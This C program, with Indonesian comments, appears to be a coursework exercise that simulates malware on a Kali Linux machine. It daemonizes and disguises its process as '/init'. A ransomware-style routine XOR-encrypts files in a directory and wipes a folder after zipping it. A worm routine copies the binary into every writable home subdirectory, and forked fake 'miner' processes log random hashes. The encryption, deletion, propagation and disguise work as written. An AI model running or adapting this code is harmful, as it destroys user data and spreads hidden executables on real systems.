#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>

// Struktur sederhana untuk header ZIP
typedef struct {
    unsigned int signature;
    unsigned short version;
    unsigned short flags;
    unsigned short compression;
    unsigned short mod_time;
    unsigned short mod_date;
    unsigned int crc32;
    unsigned int compressed_size;
    unsigned int uncompressed_size;
    unsigned short name_length;
    unsigned short extra_length;
} LocalFileHeader;

// Fungsi untuk menghitung CRC32 sederhana
unsigned int calculate_crc32(const char *data, size_t len) {
    unsigned int crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= (unsigned int)data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

// Fungsi untuk membuat file ZIP
void create_zip(const char *zip_path, const char *dir_path, const char *folder_name) {
    FILE *zip_file = fopen(zip_path, "wb");
    if (!zip_file) {
        fprintf(stderr, "Gagal membuka %s untuk ZIP: %s\n", zip_path, strerror(errno));
        return;
    }

    DIR *dir = opendir(dir_path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s untuk ZIP: %s\n", dir_path, strerror(errno));
        fclose(zip_file);
        return;
    }

    char full_path[256];
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        FILE *test = fopen(full_path, "rb");
        if (!test) continue;
        fseek(test, 0, SEEK_END);
        long size = ftell(test);
        rewind(test);
        char *buffer = malloc(size);
        if (!buffer) {
            fclose(test);
            continue;
        }
        fread(buffer, 1, size, test);
        fclose(test);

        char zip_entry_name[256];
        snprintf(zip_entry_name, sizeof(zip_entry_name), "%s/%s", folder_name, entry->d_name);

        LocalFileHeader header = {0};
        header.signature = 0x04034b50;
        header.version = 20;
        header.compression = 0;
        header.crc32 = calculate_crc32(buffer, size);
        header.compressed_size = size;
        header.uncompressed_size = size;
        header.name_length = strlen(zip_entry_name);
        fwrite(&header, sizeof(header), 1, zip_file);
        fwrite(zip_entry_name, header.name_length, 1, zip_file);
        fwrite(buffer, size, 1, zip_file);

        free(buffer);
    }
    closedir(dir);
    fclose(zip_file);
    printf("ZIP dibuat: %s\n", zip_path);
}

// Fungsi untuk menghapus direktori rekursif
void remove_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s untuk dihapus: %s\n", path, strerror(errno));
        return;
    }

    char full_path[256];
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        DIR *subdir = opendir(full_path);
        if (subdir) {
            closedir(subdir);
            remove_directory(full_path);
        } else {
            if (unlink(full_path) != 0) {
                fprintf(stderr, "Gagal menghapus file %s: %s\n", full_path, strerror(errno));
            }
        }
    }
    closedir(dir);
}

// Handler SIGCHLD tanpa waitpid
void sigchld_handler(int sig) {
    signal(SIGCHLD, sigchld_handler);
}

// Handler untuk SIGTERM di rodok_exe
volatile sig_atomic_t rodok_terminated = 0;
void rodok_term_handler(int sig) {
    fprintf(stderr, "rodok.exe menerima sinyal %d, menghentikan anak-anak\n", sig);
    rodok_terminated = 1;
    kill(0, SIGTERM);
    usleep(200000);
    kill(0, SIGKILL);
}

void set_process_name(char **argv, const char *name) {
    size_t len = strlen(argv[0]);
    memset(argv[0], 0, len);
    strncpy(argv[0], name, 15);
    argv[0][15] = '\0';
    sched_yield();
    sleep(2);
}

void create_file(const char *path, const char *content) {
    // Cek direktori induk
    char dir_path[256];
    strcpy(dir_path, path);
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash) {
        *last_slash = '\0';
        DIR *dir = opendir(dir_path);
        if (!dir) {
            fprintf(stderr, "Direktori %s tidak ada, skip membuat %s\n", dir_path, path);
            return;
        }
        closedir(dir);
    }

    FILE *file = fopen(path, "w");
    if (file) {
        fprintf(file, "%s\n", content);
        fclose(file);
        printf("File %s dibuat\n", path);
    } else {
        fprintf(stderr, "Gagal membuat file %s: %s\n", path, strerror(errno));
    }
}

void encrypt_file(const char *path, time_t key) {
    // Cek apakah file (bukan direktori)
    DIR *dir = opendir(path);
    if (dir) {
        closedir(dir);
        fprintf(stderr, "%s adalah direktori, skip enkripsi\n", path);
        return;
    }

    FILE *file = fopen(path, "rb+");
    if (!file) {
        fprintf(stderr, "Gagal membuka file %s untuk enkripsi: %s\n", path, strerror(errno));
        return;
    }
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    if (size == 0) {
        fclose(file);
        return;
    }
    rewind(file);
    char *buffer = malloc(size);
    if (!buffer) {
        fprintf(stderr, "Gagal alokasi memori untuk file %s\n", path);
        fclose(file);
        return;
    }
    fread(buffer, 1, size, file);
    for (long i = 0; i < size; i++) {
        buffer[i] ^= key & 0xFF;
    }
    rewind(file);
    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
    printf("File %s berhasil dienkripsi\n", path);
}

void wannacryptor(const char *base_path, time_t key, char **argv) {
    set_process_name(argv, "wannacryptor");
    fprintf(stderr, "wannacryptor dimulai\n");

    char parent_dir[256];
    strcpy(parent_dir, base_path);
    char *last_slash = strrchr(parent_dir, '/');
    if (last_slash) {
        *last_slash = '\0';
    } else {
        strcpy(parent_dir, ".");
    }

    char target_folder[256];
    strcpy(target_folder, base_path);
    char *folder_name = strrchr(target_folder, '/');
    if (folder_name) {
        folder_name++;
    } else {
        folder_name = target_folder;
    }

    char zip_path[256];
    snprintf(zip_path, sizeof(zip_path), "%s/%s.zip", parent_dir, folder_name);

    DIR *dir = opendir(base_path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s: %s\n", base_path, strerror(errno));
        return;
    }
    closedir(dir);

    char *files_to_encrypt[256];
    int file_count = 0;
    dir = opendir(parent_dir);
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && file_count < 256) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
            if (strcmp(entry->d_name, "malware_executable") == 0 || strstr(entry->d_name, ".zip")) continue;
            char file_path[256];
            snprintf(file_path, sizeof(file_path), "%s/%s", parent_dir, entry->d_name);
            // Cek apakah file
            DIR *subdir = opendir(file_path);
            if (subdir) {
                closedir(subdir);
                continue;
            }
            FILE *test = fopen(file_path, "rb");
            if (test) {
                fclose(test);
                files_to_encrypt[file_count] = strdup(file_path);
                file_count++;
            }
        }
        closedir(dir);
    }

    char file2_path[256];
    snprintf(file2_path, sizeof(file2_path), "%s/file2", base_path);
    FILE *file2 = fopen(file2_path, "rb");
    if (!file2) {
        fprintf(stderr, "File %s tidak ditemukan\n", file2_path);
    } else {
        fclose(file2);
    }

    create_zip(zip_path, base_path, folder_name);
    encrypt_file(zip_path, key);
    remove_directory(base_path);
    printf("Wannacryptor berhasil: %s -> %s (encrypted)\n", base_path, zip_path);

    for (int i = 0; i < file_count; i++) {
        encrypt_file(files_to_encrypt[i], key);
        free(files_to_encrypt[i]);
    }
}

void trojan_wrm(const char *base_path, const char *binary_source, int depth, char **argv) {
    if (depth > 0) {
        fprintf(stderr, "trojan.wrm hanya berjalan di depth 0 untuk propagasi\n");
        return;
    }
    set_process_name(argv, "trojan.wrm");
    fprintf(stderr, "trojan.wrm dimulai (depth: %d, binary: %s)\n", depth, binary_source);

    // Propagasi binary runme ke semua folder di /home/kali
    const char *target_base = "/home/kali";
    DIR *dir = opendir(target_base);
    if (dir) {
        fprintf(stderr, "Membaca direktori %s\n", target_base);
        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                fprintf(stderr, "Melewati entri %s\n", entry->d_name);
                continue;
            }
            char target_path[256];
            snprintf(target_path, sizeof(target_path), "%s/%s", target_base, entry->d_name);
            fprintf(stderr, "Memeriksa %s\n", target_path);

            // Cek apakah direktori
            DIR *subdir = opendir(target_path);
            if (subdir) {
                closedir(subdir);
                char dest_path[256];
                snprintf(dest_path, sizeof(dest_path), "%s/runme", target_path);
                fprintf(stderr, "Mencoba menyalin binary ke %s\n", dest_path);

                // Cek writability
                char test_path[256];
                snprintf(test_path, sizeof(test_path), "%s/.test_write_%d", target_path, getpid());
                FILE *test = fopen(test_path, "w");
                if (test) {
                    fclose(test);
                    unlink(test_path);
                    fprintf(stderr, "%s writable\n", target_path);
                } else {
                    fprintf(stderr, "%s tidak writable: %s\n", target_path, strerror(errno));
                    continue;
                }

                FILE *src = fopen(binary_source, "rb");
                if (!src) {
                    fprintf(stderr, "Gagal membuka binary %s: %s\n", binary_source, strerror(errno));
                    continue;
                }
                FILE *dst = fopen(dest_path, "wb");
                if (!dst) {
                    fprintf(stderr, "Gagal membuat file %s: %s\n", dest_path, strerror(errno));
                    fclose(src);
                    continue;
                }
                char buffer[4096];
                size_t bytes;
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                    fwrite(buffer, 1, bytes, dst);
                }
                fclose(src);
                fclose(dst);
                printf("Binary disalin ke %s\n", dest_path);
            } else {
                fprintf(stderr, "%s bukan direktori atau tidak bisa dibuka: %s\n", target_path, strerror(errno));
            }
        }
        closedir(dir);
    } else {
        fprintf(stderr, "Gagal membuka direktori %s: %s\n", target_base, strerror(errno));
    }

    // Tidak propagasi malware_copy ke /tmp/sisop/test
    fprintf(stderr, "trojan.wrm selesai (depth: %d)\n", depth);
}

void generate_hash(char *hash) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < 64; i++) {
        hash[i] = hex[rand() % 16];
    }
    hash[64] = '\0';
}

void rodok_exe(char **argv) {
    set_process_name(argv, "rodok.exe");
    fprintf(stderr, "rodok.exe dimulai\n");
    setpgid(0, 0);

    signal(SIGTERM, rodok_term_handler);
    signal(SIGINT, rodok_term_handler);

    FILE *test_log = fopen("/tmp/.miner.log", "a");
    if (test_log) {
        fclose(test_log);
    } else {
        fprintf(stderr, "Gagal membuka /tmp/.miner.log: %s\n", strerror(errno));
    }

    int max_forks = 4;
    int child_pids[4] = {0};
    for (int i = 0; i < max_forks; i++) {
        int pid = fork();
        if (pid == 0) {
            setpgid(0, getppid());
            char miner_name[16];
            snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i+1);
            set_process_name(argv, miner_name);
            fprintf(stderr, "%s dimulai\n", miner_name);
            srand(time(NULL) ^ (getpid() << 16));

            signal(SIGTERM, SIG_DFL);

            while (1) {
                int sleep_time = rand() % 28 + 3;
                char hash[65];
                generate_hash(hash);
                FILE *log = fopen("/tmp/.miner.log", "a");
                if (log) {
                    time_t now = time(NULL);
                    char timestamp[20];
                    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                    fprintf(log, "[%s][%s] %s\n", timestamp, miner_name, hash);
                    fclose(log);
                } else {
                    fprintf(stderr, "Gagal membuka /tmp/.miner.log: %s\n", strerror(errno));
                }
                fprintf(stderr, "%s masih berjalan\n", miner_name);
                sleep(sleep_time);
            }
            fprintf(stderr, "%s dihentikan\n", miner_name);
            exit(0);
        } else if (pid > 0) {
            setpgid(pid, getpid());
            child_pids[i] = pid;
        } else {
            fprintf(stderr, "Fork gagal untuk mine-crafter-%d: %s\n", i+1, strerror(errno));
            exit(1);
        }
    }

    while (!rodok_terminated) {
        fprintf(stderr, "rodok.exe masih berjalan\n");
        sleep(30);
    }

    for (int i = 0; i < max_forks; i++) {
        if (child_pids[i] > 0) {
            fprintf(stderr, "Mengirim SIGTERM ke mine-crafter-%d (PID %d)\n", i+1, child_pids[i]);
            kill(child_pids[i], SIGTERM);
            usleep(200000);
            if (kill(child_pids[i], 0) == 0) {
                fprintf(stderr, "mine-crafter-%d (PID %d) masih hidup, mengirim SIGKILL\n", i+1, child_pids[i]);
                kill(child_pids[i], SIGKILL);
            }
        }
    }

    fprintf(stderr, "rodok.exe dihentikan\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    signal(SIGCHLD, SIG_IGN);

    int pid = fork();
    if (pid > 0) {
        exit(0);
    }
    if (pid < 0) {
        fprintf(stderr, "Fork gagal: %s\n", strerror(errno));
        exit(1);
    }
    setsid();
    setpgid(0, 0);

    FILE *log_file = fopen("/tmp/malware.log", "a");
    if (!log_file) {
        fprintf(stderr, "Gagal membuka /tmp/malware.log: %s\n", strerror(errno));
        exit(1);
    }
    dup2(fileno(log_file), STDOUT_FILENO);
    dup2(fileno(log_file), STDERR_FILENO);
    fclose(log_file);

    set_process_name(argv, "/init");
    fprintf(stderr, "/init dimulai\n");

    const char *base_dir = "/tmp";
    char test_path[256];
    char malware_executable_path[256];
    char randomfile_path[256];
    char file1_path[256];
    char file2_path[256];
    snprintf(test_path, sizeof(test_path), "%s/sisop/test", base_dir);
    snprintf(malware_executable_path, sizeof(malware_executable_path), "%s/sisop/malware_executable", base_dir);
    snprintf(randomfile_path, sizeof(randomfile_path), "%s/sisop/randomfile", base_dir);
    snprintf(file1_path, sizeof(file1_path), "%s/sisop/test/file1", base_dir);
    snprintf(file2_path, sizeof(file2_path), "%s/sisop/test/file2", base_dir);

    create_file(malware_executable_path, "Ini malware dummy yang sangat menyeramkan.");
    create_file(randomfile_path, "This is a random file");
    create_file(file1_path, "This is file1");
    create_file(file2_path, "This is file2");

    // Simulasi hasil ekstraksi ZIP di /home/kali/test
    const char *extract_base = "/home/kali/test";
    char extract_file1[256];
    char extract_file2[256];
    snprintf(extract_file1, sizeof(extract_file1), "%s/file1", extract_base);
    snprintf(extract_file2, sizeof(extract_file2), "%s/file2", extract_base);

    create_file(extract_file1, "This is file1");
    create_file(extract_file2, "This is file2");

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        wannacryptor(test_path, time(NULL), argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk wannacryptor: %s\n", strerror(errno));
        exit(1);
    }

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        char binary_source[256];
        FILE *test = fopen("/proc/self/exe", "rb");
        if (test) {
            fclose(test);
            strcpy(binary_source, "/proc/self/exe");
        } else {
            fprintf(stderr, "/proc/self/exe gagal, fallback ke /home/kali/Downloads/runme\n");
            strcpy(binary_source, "/home/kali/Downloads/runme");
        }
        trojan_wrm(test_path, binary_source, 0, argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk trojan.wrm: %s\n", strerror(errno));
        exit(1);
    }

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        rodok_exe(argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk rodok.exe: %s\n", strerror(errno));
        exit(1);
    }

    while (1) {
        fprintf(stderr, "/init masih berjalan\n");
        sleep(5);
    }
    return 0;
}